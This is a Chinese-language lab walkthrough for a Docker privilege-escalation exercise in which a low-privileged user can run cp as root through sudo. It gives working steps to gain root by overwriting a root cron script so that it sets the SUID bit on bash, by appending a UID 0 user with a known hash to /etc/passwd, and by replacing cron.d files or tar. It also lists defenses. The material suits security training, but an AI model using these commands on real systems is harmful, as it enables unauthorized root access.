# sudo cp 文件覆盖提权（组合拳）

## 快速使用（一键利用）

### 第一步：宿主机启动环境（仅这一步在宿主机）

```bash
cd ~/linux-privesc-lab/sudo-cp-write
docker compose up -d --build
docker exec -it sudo-cp-write su - lowpriv   # 密码 lowpriv123
```

### 第二步：容器内确认漏洞环境

```bash
id
sudo -l
# 预期: (root) NOPASSWD: /bin/cp
ls -la /opt/exploits/
```

### 一键利用（容器内）

```bash
cd /opt/exploits && bash exploit.sh
```

## 原理

管理员授权了 `lowpriv ALL=(root) NOPASSWD: /bin/cp`——cp 可以**以 root 身份覆盖
任意文件**（把攻击者构造的文件复制到系统路径），但 cp 没有 shell。组合拳思路：

```
sudo cp (root 覆盖任意文件)
  ├─ 拳法1: 覆盖 root cron 执行的脚本 -> cron 定时提权
  ├─ 拳法2: 构造新 /etc/passwd 覆盖 -> 加 UID=0 用户 -> su
  └─ 拳法3: 覆盖 /usr/local/bin 下工具(如 tar) -> 后续调用触发
```

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：`lowpriv ALL=(root) NOPASSWD: /bin/cp`
- 预置场景：root 的 cron 每分钟执行 /usr/local/bin/backup.sh（cp 覆盖目标）

## 手动利用（分步教学）

### 拳法 1：覆盖 cron 脚本提权（本环境预置场景）

```bash
# 1. 侦察: 找到 root cron 执行的脚本
cat /etc/crontab
ls -l /usr/local/bin/backup.sh
# 预期: root 属主 755, 每分钟执行

# 2. 准备恶意脚本
cat > /tmp/evil.sh <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF

# 3. 用 sudo cp 覆盖 (cp 以 root 覆盖, 绕过目标文件属主限制)
sudo cp /tmp/evil.sh /usr/local/bin/backup.sh

# 4. 等 1 分钟, cron 以 root 执行被覆盖的脚本
sleep 65
ls -l /bin/bash          # -rwsr-xr-x
/bin/bash -p -c 'id'     # euid=0(root) 提权成功
```

关键点：backup.sh 本身是 root:root 755（lowpriv 不能直接写），但 **cp 以 root
身份运行，root 可以覆盖任何文件**——权限检查发生在 cp 进程（root）而非调用者。

### 拳法 2：构造并覆盖 /etc/passwd

```bash
# 1. 先把原 passwd 拷出来 (sudo cp 读 root 文件)
sudo cp /etc/passwd /tmp/passwd.bak

# 2. 生成哈希并构造新文件 (原内容 + 恶意用户)
openssl passwd -1 -salt hacker 123456
# 输出: $1$hacker$6luIRwdGpBvXdP.GMwcZp/
cp /tmp/passwd.bak /tmp/passwd.new
echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash' >> /tmp/passwd.new

# 3. 用 sudo cp 覆盖 /etc/passwd
sudo cp /tmp/passwd.new /etc/passwd

# 4. 登录
echo 123456 | su hacker -c 'id'
# 预期: uid=0(root)
```

### 拳法 3：覆盖 /etc/cron.d 现有文件（如果有）

```bash
# 若 /etc/cron.d 下存在任何文件, 先备份再覆盖
sudo cp /etc/cron.d/<现有文件> /tmp/bak
echo '* * * * * root chmod u+s /bin/bash' > /tmp/pwn
sudo cp /tmp/pwn /etc/cron.d/<现有文件>
sleep 65 && /bin/bash -p -c 'id'
```

## 为什么能成功

| 环节 | 说明 |
|:---|:---|
| sudo cp | cp 以 euid=0 运行，源和目标都按 root 权限处理 |
| 覆盖 cron 脚本 | cron 不校验脚本内容变化，到点就执行 |
| 覆盖 passwd | 用完整的新文件替换，保留原用户 + 追加 UID=0 用户 |

## 防御

- 不授权 cp/mv/install 类 sudo（GTFOBins file-write 危险命令）
- root cron 脚本目录设 root:root 755，脚本 755，并做完整性监控
- 监控 /etc/passwd 哈希变化（AIDE/auditd）

## 扩展教学（网络搜索整理）

### 真实场景

sudo cp 常出现在：管理员"方便地"替换配置文件、部署脚本、日志轮转场景。
OSCP/CTF 中 `cp` 是高频误授权命令。

### 组合拳变体：覆盖 tar 等工具

```bash
# 构造伪 tar, sudo cp 覆盖 /usr/local/bin/tar
echo '#!/bin/bash
chmod u+s /bin/bash' > /tmp/fake-tar
sudo cp /tmp/fake-tar /usr/local/bin/tar
# 等 root 或其他进程调用 tar 时触发 (本环境 backup.sh 若调用 tar 即触发)
```

### 检测

```bash
sudo grep -RniE 'cp|install|mv' /etc/sudoers /etc/sudoers.d/
# 定期校验 cron 脚本哈希
sha256sum /usr/local/bin/*.sh
```

## 验证记录

2026-08-26 实机验证：`sudo cp /tmp/evil.sh /usr/local/bin/backup.sh` 覆盖 root cron 脚本后等待 65 秒，`/bin/bash -p -c 'id'` 输出 `uid=1000(lowpriv) ... euid=0(root)`，复现成功。
